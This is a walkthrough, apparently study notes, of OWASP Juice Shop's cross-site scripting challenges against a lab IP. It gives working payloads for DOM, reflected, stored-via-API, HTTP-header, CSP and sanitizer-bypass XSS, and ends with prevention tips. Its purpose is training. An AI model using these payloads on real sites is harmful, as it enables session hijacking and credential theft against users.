# OWASP Juice Shop – XSS Hacking Challenges

## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a web vulnerability where an attacker injects malicious scripts into a trusted application.  
When victims load the page, their browser executes the attacker’s code.  
Impact → Credential theft, session hijacking, phishing, or full system compromise.  

---

# 1. DOM XSS (Document Object Model XSS)

**Definition:**  
DOM-based XSS occurs when JavaScript directly modifies the DOM (`document.write`, `innerHTML`, `location.hash`, etc.) using untrusted data, causing execution of malicious code in the browser.

**Payload:**
```html
<iframe src="javascript:alert(`xss`)">
````

* Vulnerable Parameter → **Search Input**
* Example InURL:

```
http://10.250.207.145:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
```

---

# 2. Bonus Payload (Audio Autoplay XSS)

**Definition:**
A variation of DOM XSS where instead of alert boxes, attackers embed **media players or external content** that auto-runs in the victim’s browser.

**Payload:**

```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&auto_play=true">
</iframe>
```

Encoded version also works:

```
http://10.250.207.145:3000/#/search?q=%3C%69%66%72%61...
```

---

# 3. Reflected XSS

**Definition:**
Reflected XSS happens when user input is immediately returned in the HTTP response without sanitization.
Attack executes only when a victim **clicks a crafted URL**.

**Payload:**

```html
<iframe src="javascript:alert(`xss`)">
```

* Vulnerable Parameter → **Track Order (id)**
* Example:

```
http://10.250.207.145:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">
```

---

# 4. API-only XSS (Stored via API)

**Definition:**
Occurs when an attacker injects malicious payloads **directly into backend APIs** (e.g., `PUT /api/products`), which are then stored in the database and executed later in the frontend.

**Payload:**

```http
PUT /api/Products/1 HTTP/1.1
Content-Type: application/json

{
  "name": "<iframe src='javascript:alert(`xss`)'>"
}
```

---

# 5. Client-side XSS Protection Bypass

**Definition:**
Some apps block scripts on the frontend using JavaScript validation, but attackers can bypass this by sending payloads **directly to the backend** (e.g., via Burp Repeater).

**Payload in Registration (Email field):**

```json
"email": "<iframe src=\"javascript:alert(`xss`)\">"
```

---

# 6. CSP Bypass (Content Security Policy)

**Definition:**
CSP (Content Security Policy) is a browser defense that controls which scripts/resources can run.
Weak or misconfigured CSP rules can be bypassed, allowing XSS.

**Payload:**

```html
<script>alert(`xss`)</script>
```

* Weak CSP Example:

```
script-src 'self' 'unsafe-eval' 'unsafe-inline';
```

🔗 [How to Trick CSP](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

---

# 7. HTTP Header XSS

**Definition:**
Some apps reflect HTTP header values (e.g., `X-Forwarded-For`, `True-Client-IP`) into the response without sanitization, enabling persistent XSS.

**Example Header:**

```http
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```

🔗 [PortSwigger – Spoofable Client IP](https://portswigger.net/kb/issues/00400110_spoofable-client-ip-address)

---

# 8. Server-side XSS Protection Bypass

**Definition:**
Even when server-side sanitization is enabled, **flawed sanitizers** can miss payloads (e.g., breaking tags or using encoding tricks), leading to stored XSS.

**Payload (Customer Feedback):**

```html
<<iframe src="csrf-attack"/>iframe src="javascript:alert(`xss`)">
```

---

# 9. Video XSS

**Definition:**
XSS payloads can be hidden in media files or video descriptions that get rendered unsafely by the application.

**Payload:**

```html
</script><script>alert(`xss`)</script>
```

## Security Policy

**Definition:**
A `security.txt` file provides contact information for security researchers to report vulnerabilities.

* Location:

```
http://10.250.207.145:3000/.well-known/security.txt
```

* Reference: [securitytxt.org](https://securitytxt.org/)

---

## ✅ Prevention Summary

* Use **output encoding** (`innerText`, `textContent`) instead of `innerHTML`.
* Perform **server-side sanitization** (remove `<script>`, `<iframe>`, etc.).
* Apply a **strict CSP** (no `unsafe-inline`, no `unsafe-eval`).
* Validate inputs **on both client and server**.
* Escape user-generated content before rendering.
